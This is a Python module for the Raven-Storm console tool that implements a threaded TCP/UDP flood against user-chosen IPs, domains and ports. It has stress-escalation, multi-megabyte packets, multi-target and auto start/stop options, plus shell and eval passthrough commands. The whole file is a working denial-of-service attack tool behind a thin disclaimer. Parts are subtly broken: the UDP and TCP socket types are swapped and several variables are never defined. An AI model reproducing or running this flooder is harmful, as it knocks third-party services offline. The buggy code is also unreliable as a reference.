from CLIF_Framework.framework import event
from CLIF_Framework.framework import tools
from os import system
from time import sleep
from time import time
from threading import Thread
import socket
event = event()
tools = tools()


class Main:
	def __init__(selfie, console):
		global self
		global var
		self = selfie
		var = console

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.port = [80]  # Port 80 protocol == TCP
		var.threads = 160
		var.ip = [""]
		var.socketmethod = "TCP"  # / UDP
		var.sleep = 0
		var.outtxt = True
		var.outtxtmute = False
		var.message = "hey, it's me rs."
		var.messagezw = var.message
		var.rtxt = 1
		var.stress = False
		var.timeforstress = 1
		var.autostart = 0
		var.autostop = 0
		var.autostep = 0
		var.autostarttime = 0  # Will be used as a variable for autostop

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.commands(self.show_values, ["values", "ls"])

		event.help_comment("|\n|-- Main commands:")
		event.help("port", "Set the target's port.")
		event.help("threads", "Set the number of threads.")
		event.help("ip", "Set the target's IP.")
		event.help("web", "Target the ip of a domain.")
		event.help("method", "Change attack method between UPD, TCP.")
		event.help("sleep", "Set the time delay between each packet send.")
		event.help("outtxt", "Output each packets send status: enable/disable.")
		event.help("mute", "Do not output the connection reply.")
		event.help(["values", "ls"], "Show all selected options.")
		event.help("run", "Start the attack.")
		event.help_comment("|\n|-- Set Send-text:")
		event.help("message", "Set the packt's message.")
		event.help("repeat", "Repeat the target's message specific times.")
		event.help("mb", "Send specified amount of MB packtes to server.")
		event.help_comment("|\n|-- Stress Testing:")
		event.help("stress", "Enable the Stress-testing mode.")
		event.help("st wait", "Set the time between each stress level.")
		event.help_comment("|\n|-- Multiple:")
		event.help("ips", "Set multple ips to target.")
		event.help("webs", "Set multple domains to target.")
		event.help("ports", "Attack multiple ports.")
		event.help_comment("|\n|-- Automation:")
		event.help("auto start", "Set the delay before the attack should start.")
		event.help("auto step", "Set the delay between the next thread to activate.")
		event.help("auto stop", "Set the delay after the attack should stop.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
The creators of Raven-Storm are not responsible
for any of your activitys or issues caused by Raven-Storm!
It is strictly illegal to exploit servers
which are not owned by you.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("\033[1;32;0mHave a nice day.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Enter shell command: \033[1;32;0m", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("Enter debug command: \033[1;32;0m", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("The command you entered does not exist.")
		print("")

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	def help(self):
		event.help_title("\x1b[1;39mUDP/TC PFlood Help:\x1b[0;39m")
		tools.help("|   |-- ", " :: ", event)
		print("\033[1;32;0m")

	@event.command
	def port(command):
		print("")
		try:
			var.port = [int(tools.arg("Port: ", "port ", command))]
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def threads(command):
		print("")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ip(command):
		print("")
		var.ip = [tools.arg("Target: ", "ip ", command)]
		if "." not in var.ip[0]:
			print("This IP does not exist.")
		print("")

	@event.command
	def web(command):
		print(" ")
		try:
			webtoip = tools.arg("Website: ", "web ", command)
			webtoip = webtoip.replace("http://", "")
			webtoip = webtoip.replace("https://", "")
			webtoiptxt = str(socket.gethostbyname(webtoip))
			var.ip = [webtoiptxt]
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def method(command):
		print("")
		if var.socketmethod == "TCP":
			var.socketmethod = "UDP"
			print("Method changed to UDP.")
		else:
			var.socketmethod = "TCP"
			print("Method changed to TCP.")
		print("")

	@event.command
	def sleep(command):
		print("")
		try:
			var.sleep = int(tools.arg("Delay in seconds: ", "sleep ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def outtxt(command):
		print(" ")
		if var.outtxt:
			print("The output has been reduced.")
			var.outtxt = False
		else:
			print("The output has been set to normal.")
			var.outtxt = True
		print(" ")

	@event.command
	def mute(command):
		print(" ")
		if var.outtxtmute:
			print("The output has been disabled.")
			var.outtxtmute = False
		else:
			print("The output has been enabled.")
			var.outtxtmute = True
		print(" ")

	@event.command
	def message(command):
		print("")
		var.message = tools.arg("Message: ", "message ", command)
		var.rtxt = 1
		print("")

	@event.command
	def repeat(command):
		print(" ")
		try:
			rtxtzw = var.rtxt
			var.rtxt = int(tools.arg("Repeat message x times: ", "repeat ", command))
			if var.rtxt < 1:
				print("There was an error while executing.")
			else:
				if rtxtzw < var.rtxt:
					var.messagezw = var.message
					var.message = (str(var.message) * int(var.rtxt))
				else:
					var.message = (str(var.messagezw) * int(var.rtxt))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def mb(command):
		print(" ")
		try:
			setmb = int(tools.arg("Size of Packet in MB: ", "mb ", command))
			setmb = int(setmb / 0.000001)
			var.message = ("r" * setmb)
			var.rtxt = setmb
			var.messagezw = "r"
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def stress(command):
		print(" ")
		if var.stress:
			print("The stress mode has been disabled.")
			var.stress = False
		else:
			print("The stress mode has been enabled.")
			var.stress = True
		print(" ")

	@event.command
	def st_wait(command):
		print("")
		try:
			var.timeforstress = int(tools.arg("Delay in seconds: ", "st wait ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ips(command):
		print("")
		var.ip = tools.arg("Targets (Seperated by ', '): ", "ips ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("This IP does not exist.")
		print("")

	@event.command
	def ports(command):
		print("")
		try:
			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
			for port in var.port:
				if isinstance(port, int):
					print("Entered ports cannot be used.")
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def webs(command):
		print(" ")
		try:
			webtoip = tools.arg("Websites (Seperated by ', '): ", "webs ", command).split(", ")
			for pos, web in enumerate(webtoip):
				webtoip[pos] = web.replace("http://", "")
				webtoip[pos] = webtoip[pos].replace("https://", "")
				webtoip[pos] = str(socket.gethostbyname(webtoip[pos]))
			var.ip = webtoip
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_step(command):
		print(" ")
		try:
			var.autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_start(command):
		print(" ")
		try:
			var.autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	def show_values(self):
		print("")
		print("Ports: %s" % var.port)
		print("Threads: %s" % var.threads)
		print("Targets: %s" % var.ip)
		print("Method: %s" % var.socketmethod)
		print("Time between each packet: %s" % var.sleep)
		print("Output: %s" % var.outtxt)
		print("Muted: %s" % var.outtxtmute)
		print("Packet message: %s" % var.message[:15])
		print("Repeat packet text: %s" % var.rtxt)
		print("Stress-Test mode: %s" % var.stress)
		print("Stress-Test level duration: %s" % var.timeforstress)
		print("Start Delay: %s" % var.autostart)
		print("Stop after x seconds: %s" % var.autostop)
		print("Time between threads: %s" % var.autostep)
		print("")

	def stresstest(self):
		print(" ")
		print("Time between: %s" % str(var.timeforstress))
		print("Using %s threads per round" % str(var.threads))
		print("To stop the attack press: CRTL + Z")
		print(" ")
		sleep(2)
		while True:
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
				except Exception:
					print("\x1b[0;39mFailed to start a thread.")
			sleep(var.timeforstress)
			if var.stresserror:
				print(" ")
				print("Stopped at %s threads!" % (str(var.stresstestvar * var.threads)))
				print(" ")
				var.runactive = False
				quit()
			else:
				var.stresstestvar += 1

	def ddos(self):
		var.runactive = True
		mesalready = False
		packet = ("GET /%s HTTP/1.1\nHost: %s\n\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\n%s" % (var.ip, var.ip, var.message)).encode("utf-8")
		if not var.outtxtmute:
			print("Thread started!")
		if var.socketmethod == "UDP":
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while var.runactive:
			for ipvalue in var.ip:
				for portvalue in var.port:
					try:
						if var.socketmethod == "TCP":
							mysocket.connect((ipvalue, portvalue))
						else:
							try:
								mysocket.bind((ipvalue, portvalue))
							except Exception:
								pass
						if var.socketmethod == "TCP":
							mysocket.send(packet)
						try:
							mysocket.sendto(packet, (ipvalue, portvalue))
						except Exception:
							mysocket.send(packet)
						if var.outtxt:
							if not mesalready:
								mesalready = True
								print("\033[1;32;40m\nSuccess for %s with port %s!" % (ipvalue, portvalue))
						# sleep(sleepy)
					except socket.error:
						if not var.outtxtmute:
							mesalready = False
							print("\033[1;31;40m\nTarget %s with port %s not accepting request!" % (ipvalue, portvalue))
						if var.stress:
							var.stresserror = True
						if var.socketmethod == "TCP":
							try:
								mysocket.close()
							except Exception:
								pass

			if int(var.autostop) != 0:
				autoendtime = time()
				autotimer = (int(autoendtime) - int(var.autostarttime))
				if var.autostop <= autotimer:
					print("\x1b[0;39mAuto Stop")
					var.runactive = False
					quit()

	@event.command
	def run(command):
		print("")
		if var.ip != "":
			if not tools.question("Do you agree to not use this tool for illegal purpose?"):
				print("Agreement not accepted.")
				quit()
			else:
				print("")
				print("To stop the attack press: CRTL + Z")
				sleep(3)
				sleep(var.autostart)
				if var.stress:
					if len(var.target) == 1 and len(var.port) == 1:
						self.stresstest()
					else:
						print("Do not use multiple targets/ports in the Stress-Testing mode.")
				else:  # Normal Mode
					if var.autostop != 0:
						var.autostarttime = time()
					for thread in range(var.threads):
						try:
							t = Thread(target=self.ddos)
							sleep(var.autostep)
							t.start()
						except Exception:
							print("Could not start thread %s." % thread)
		else:
			print("No target has been defined.")
		print("")


def setup(console):
	console.ps1 = "\033[1;32;0mL4> "
	console.add(Main(console), event)
